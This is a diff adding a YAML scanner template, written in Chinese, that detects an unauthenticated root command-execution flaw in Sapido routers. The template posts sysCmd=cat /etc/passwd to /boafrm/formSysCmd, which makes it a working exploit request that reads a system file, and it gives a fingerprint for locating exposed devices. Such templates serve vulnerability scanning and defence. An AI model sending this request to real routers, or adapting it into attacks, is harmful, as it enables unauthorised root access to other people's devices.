@@ -1,0 +1,23 @@
+id: sapido-router-rce
+
+info:
+  name: Sapido 多款路由器 远程命令执行漏洞
+  author: zan8in
+  severity: critical
+  description: |
+    Sapido多款路由器在未授权的情况下，导致任意访问者可以以Root权限执行命令
+    http://xxx.xxx.xxx.xxx/syscmd.asp
+    http://xxx.xxx.xxx.xxx/syscmd.htm
+    app="Sapido-路由器"
+  reference:
+    - http://wiki.peiqi.tech/wiki/iot/Sapido/Sapido%20%E5%A4%9A%E6%AC%BE%E8%B7%AF%E7%94%B1%E5%99%A8%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /boafrm/formSysCmd
+      body: |
+        sysCmd=cat+%2Fetc%2Fpasswd&apply=Apply&submit-url=%2Fsyscmd.htm&msg=
+    expression: response.status == 302 && response.body.bcontains(b'<H1>302 Redirect</H1>') && response.headers["location"].contains("/syscmd.htm")
+expression: r0()
